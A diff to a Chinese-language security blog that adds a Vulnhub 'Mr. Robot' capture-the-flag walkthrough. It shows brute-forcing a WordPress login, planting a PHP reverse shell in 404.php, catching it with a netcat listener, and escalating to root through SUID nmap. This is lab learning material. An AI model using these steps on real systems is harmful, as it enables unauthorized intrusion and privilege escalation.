@@ -284,6 +284,230 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/22/mrRobot/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yasso🇨🇳">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/12/22/mrRobot/" itemprop="url">mrRobot</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-12-22T08:31:19+08:00">
+                2021-12-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Vulnhub%E7%B3%BB%E5%88%97/" itemprop="url" rel="index">
+                    <span itemprop="name">Vulnhub系列</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/12/22/mrRobot/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2021/12/22/mrRobot/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2021/12/22/mrRobot/" class="leancloud_visitors" data-flag-title="mrRobot">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  305
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>靶机：192.168.12.129</strong><br><strong>kali: 192.168.12.128</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.12.129</code> <strong>–扫描开放端口</strong><br><img src="/2021/12/22/mrRobot/1.png"></p>
+<p><code>dirsearch -u http://192.168.12.129/</code> <strong>–扫下web目录</strong></p>
+<p><strong>–robots.txt和wordpress登录框–</strong><br><img src="/2021/12/22/mrRobot/4.png"><br><img src="/2021/12/22/mrRobot/2.png"><br><strong>得到第一个key</strong><br><img src="/2021/12/22/mrRobot/3.png"><br><strong>fsocity.dic打开是个字典，猜测可以用来爆破wordpress登录框</strong></p>
+<p><strong>–bp抓包,fsocity当作字典–</strong><br><img src="/2021/12/22/mrRobot/5.png"></p>
+<p><strong>—80多万。。。。。。—</strong></p>
+<p><img src="/2021/12/22/mrRobot/7.png"><br><strong>可以确定用户名是Elliot，那用户名不用爆了(长度4204估计回显的是密码错误)</strong></p>
+<p><strong>爆破了n年(丢。密码在字典倒数第二个，倒过来就好爆了)</strong></p>
+<p>用户名：Elliot 密码：ER28-0652<br><img src="/2021/12/22/mrRobot/8.png"></p>
+<p><strong>–登陆–</strong><br><img src="/2021/12/22/mrRobot/9.png"> </p>
+<p><code>find / -name php-reverse-shell.php</code> <strong>kali自带的反弹shell</strong><br><code>cd /usr/share/laudanum/php/</code> <strong>—复制php-reverse-shell.php的内容到wp中的404.php</strong></p>
+<p><img src="/2021/12/22/mrRobot/15.png"> </p>
+<p><strong>修改ip，port为监听机kali的ip与端口</strong><br><img src="/2021/12/22/mrRobot/16.png"> </p>
+<p><code>nc -lvp 4444</code> <strong>-监听本地4444端口</strong></p>
+<p><img src="/2021/12/22/mrRobot/11.png"> </p>
+<p>访问<code>http://192.168.12.129/wp-admin/404.php</code></p>
+<p><strong>–成功弹shell–</strong></p>
+<p><img src="/2021/12/22/mrRobot/17.png"> </p>
+<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code> <strong>–优化终端</strong></p>
+<p><img src="/2021/12/22/mrRobot/18.png"> </p>
+<h4 id="二、提权-SUID提权"><a href="#二、提权-SUID提权" class="headerlink" title="二、提权(SUID提权)"></a>二、提权(SUID提权)</h4><p><code>cd</code><strong>home文件夹存在robot用户，并且在其中发现登录密码</strong><br><img src="/2021/12/22/mrRobot/14.png"> </p>
+<p><strong>robot密码：abcdefghijklmnopqrstuvwxyz</strong><br><img src="/2021/12/22/mrRobot/13.png"> </p>
+<p><code>su - robot</code>  <strong>–登陆robot用户</strong></p>
+<p><img src="/2021/12/22/mrRobot/19.png"> </p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junsec/p/11652723.html" title="find / -perm -u=s -type f 2&gt;/dev/null">Linux suid 提权</a></p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code> <strong>—查找suid文件</strong></p>
+<p><img src="/2021/12/22/mrRobot/20.png"> </p>
+<p><code>ls -l /usr/local/bin/nmap</code> <strong>–查看下nmap的权限是root权限</strong><br><img src="/2021/12/22/mrRobot/21.png"> </p>
+<p><code>nmap --interactive</code> <strong>–交互</strong></p>
+<p><code>!sh</code>  <strong>—成功root</strong></p>
+<p><img src="/2021/12/22/mrRobot/22.png"> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/18/Tr0ll-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1894,7 +2118,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1977,7 +2201,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">2.3k</span>
+    <span title="Site words total count">2.6k</span>
   
 </div>
 
